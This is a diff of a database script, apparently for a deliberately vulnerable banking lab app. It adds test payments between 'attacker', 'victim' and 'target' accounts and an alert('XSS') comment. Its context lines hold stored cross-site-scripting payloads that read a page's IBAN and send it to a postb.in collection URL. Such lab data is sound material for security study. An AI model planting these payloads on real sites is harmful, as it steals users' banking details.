@@ -28,7 +28,7 @@ SET FILES NIO TRUE
 SET FILES NIO SIZE 256
 SET FILES LOG TRUE
 SET FILES LOG SIZE 50
-SET FILES CHECK 412
+SET FILES CHECK 654
 SET DATABASE COLLATION "SQL_TEXT" PAD SPACE
 CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
 ALTER USER SA SET LOCAL TRUE
@@ -62,6 +62,25 @@ INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''https://postb.
 INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''http://postb.in/1601121815843-1528982487507?iban=''.concat(document.getElementById(''iban'').text));</script>','26-09-2020','5')
 INSERT INTO COMMENT VALUES('<script>new Image().src = encodeURI(''http://postb.in/1601121815843-1528982487507?iban='' document.getElementById(''iban'').text);</script>','26-09-2020','5')
 INSERT INTO COMMENT VALUES('<script>\u000anew Image().src = encodeURI("https://postb.in/1601121815843-1528982487507?iban=".concat(document.getElementById(''iban'').text));\u000a</script>','26-09-2020','5')
+INSERT INTO COMMENT VALUES('<script>alert("XSS")</script>','29-09-2020','5')
 INSERT INTO PAYMENT VALUES('greg@gmail.com','attacker@mail.com',100,'SFr',100)
 INSERT INTO PAYMENT VALUES('greg@gmail.com','attacker@mail.com',100,'SFr',1000)
+INSERT INTO PAYMENT VALUES('greg@gmail.com','target@mail.com',122,'SFr',122)
+INSERT INTO PAYMENT VALUES('greg@gmail.com','target@mail.com',129,'SFr',129)
+INSERT INTO PAYMENT VALUES('greg@gmail.com','greg@gmail.com',129,'SFr',129)
+INSERT INTO PAYMENT VALUES('greg@gmail.com','greg@gmail.com',100,'SFr',100)
+INSERT INTO PAYMENT VALUES('greg@gmail.com','greg@gmail.com',900,'SFr',900)
+INSERT INTO PAYMENT VALUES('attacker@gmail.com','greg@gmail.com',500,'SFr',500)
+INSERT INTO PAYMENT VALUES('victim@mail.com','target@mail.com',99,'SFr',99)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@mail.com',100,'SFr',100)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@mail.com',100,'SFr',100)
+INSERT INTO PAYMENT VALUES('victim@mail.com','target@mail.com',99,'SFr',99)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@gmail.com',99,'SFr',99)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@gmail.com',400,'SFr',400)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@gmail.com',400,'SFr',400)
+INSERT INTO PAYMENT VALUES('victim@mail.com','target@mail.com',10,'SFr',10)
+INSERT INTO PAYMENT VALUES('victim@mail.com','attacker@mail.com',50,'SFr',50)
 INSERT INTO USER VALUES('greg@gmail.com','bb6679bd15b7f000a63a68cc289e8be1b7dd36710be46dffac38962a7e9a54b0')
+INSERT INTO USER VALUES('attacker@gmail.com','e64ba38a4b958c72bc0d421150ba464636422485ed72fab7086c7691ce4008cc')
+INSERT INTO USER VALUES('victim@mail.com','1bdd5b5b92e2d9f30a3b223bb359551d0da20e3702923e5f7b0a73889eba3d21')
+INSERT INTO USER VALUES('attacker@mail.com','e64ba38a4b958c72bc0d421150ba464636422485ed72fab7086c7691ce4008cc')
